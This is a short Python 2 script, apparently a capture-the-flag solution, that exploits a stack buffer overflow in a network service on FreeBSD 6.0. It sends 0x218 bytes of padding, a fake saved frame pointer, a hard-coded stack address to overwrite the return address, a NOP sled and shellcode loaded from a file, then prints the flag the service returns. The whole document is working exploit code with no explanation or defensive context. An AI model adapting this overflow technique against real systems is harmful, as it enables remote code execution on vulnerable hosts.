import socket
import sys
import struct
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( (sys.argv[1], int(sys.argv[2])))

## There is no aslr in FreeBSD 6.0 so hard coding a stack address isn't an issue
st_addr = struct.pack('I', 0xbfbfec80)

a = 'a'*0x218
a += 'bbbb'  ## ebp
a += st_addr  ## eip
a += '\x90\x90\x90\x90'

f = open('open', 'rb')
a += f.read()
f.close()

s.send(a + '\n')

y = s.recv(32)

print 'The flag is: %s' %y

s.close()
